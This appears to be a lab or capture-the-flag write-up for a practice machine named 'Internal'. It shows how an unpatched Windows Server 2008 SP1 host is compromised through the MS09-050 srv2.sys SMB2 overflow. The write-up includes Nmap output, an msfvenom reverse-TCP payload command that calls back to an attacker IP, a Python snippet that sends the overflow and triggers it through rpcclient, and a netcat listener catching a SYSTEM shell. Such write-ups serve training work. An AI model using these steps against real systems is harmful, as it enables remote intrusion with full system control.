#Windows #SMB #MS09-050 #srv2sys #BufferOverflow #KernelExploit #SYSTEM

## Overview

Internal is a Windows Server 2008 SP1 machine with no interesting web services and a minimal attack surface. The OS version identified in the Nmap SMB scripts maps directly to MS09-050, a remote kernel-level buffer overflow in `srv2.sys` that exploits the SMB2 negotiation handler. Crafting a working exploit requires replacing the original shellcode with a custom msfvenom payload and patching the Python 2 syntax to run under Python 3. The exploit lands a SYSTEM shell with no prior credentials and no foothold step.

## Recon

### Nmap

```sh
PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.0.6001 (Windows Server 2008 SP1)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds       Windows Server (R) 2008 Standard 6001 Service Pack 1
3389/tcp  open  ssl/ms-wbt-server
```

The SMB script output is the critical finding:

```
OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
smb-security-mode: message_signing: disabled (dangerous, but default)
```

Windows Server 2008 SP1 (build 6001) with SMB signing disabled and no patches. The product version `6.0.6001` maps unambiguously to Server 2008 pre-SP2.

> **Why the OS version is the whole story here:** MS09-050 targets a flaw in how `srv2.sys` handles `SMB_COM_NEGOTIATE` packets. Microsoft patched it in October 2009, but unpatched Server 2008 SP1 instances are still findable on older practice ranges. The version string in the Nmap SMB disclosure is enough to know this box is exploitable before sending a single byte of exploit traffic.

## Exploitation

### MS09-050, `srv2.sys` Remote SMB Buffer Overflow

EDB-40280 is a Python exploit for MS09-050. The stock version:
1. Runs under Python 2 (`print` without parentheses)
2. Contains shellcode that pops a local shell on the target, not a reverse shell

Both need fixing.

#### Custom Reverse Shellcode

The exploit embeds shellcode in a specially crafted SMB packet. Replacing it with a msfvenom reverse TCP payload requires generating shellcode in Python format:

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.244 LPORT=80 EXITFUNC=thread -f python
```

The `EXITFUNC=thread` flag is important: it tears down the shellcode thread cleanly instead of calling `ExitProcess`, which would crash the SMB service.

> **Why `EXITFUNC=thread` matters in kernel exploits:** MS09-050 hijacks execution inside a kernel driver thread. If the shellcode calls `ExitProcess`, it terminates the entire `System` process, taking the box down. `EXITFUNC=thread` instead calls `ExitThread`, ending only the hijacked thread while the OS continues running, leaving the reverse shell alive and the target stable.

#### Python 3 Port

Updating the exploit for Python 3 requires:
- Adding parentheses to all `print` statements
- Prefixing raw binary buffers with `b` (i.e., `buff += b"\x00..."` not `buff += "\x00..."`)
- Verifying the `socket` and `subprocess` imports still function correctly

The modified exploit sends the overflow buffer to port 445, then triggers code execution via an authenticated RPC call:

```python
s = socket()
s.connect(host)
s.send(buff)
s.close()
subprocess.call("echo '1223456' | rpcclient -U Administrator %s" % (target), shell=True)
```

The RPC call authentication attempt (even with a wrong password) triggers the already-injected kernel code.

Running the exploit:

```sh
python3 ms09_050.py 192.168.180.X
```

## Root / SYSTEM

The shell connects back as `NT AUTHORITY\SYSTEM`, no privilege escalation required because the overflow executes in kernel context:

```sh
rlwrap nc -lvnp 80
connect to [...] from (UNKNOWN) [192.168.X.X]
Microsoft Windows [Version 6.0.6001]

C:\Windows\system32> whoami
nt authority\system
```

## Takeaways

- **SMB OS disclosure is a direct exploit roadmap.** The Nmap SMB scripts handed the exact build number; one searchsploit query later the exploit is in hand.
- **Old exploits need surgery before they run.** Python 2 syntax, architecture mismatches, and local-only shellcode are all common blockers. Treat every PoC as a starting template, not a drop-in tool.
- **`EXITFUNC=thread` in kernel exploits is mandatory.** `ExitProcess` in a kernel thread crashes the target. Thread-safe shellcode keeps the box alive and the shell open.
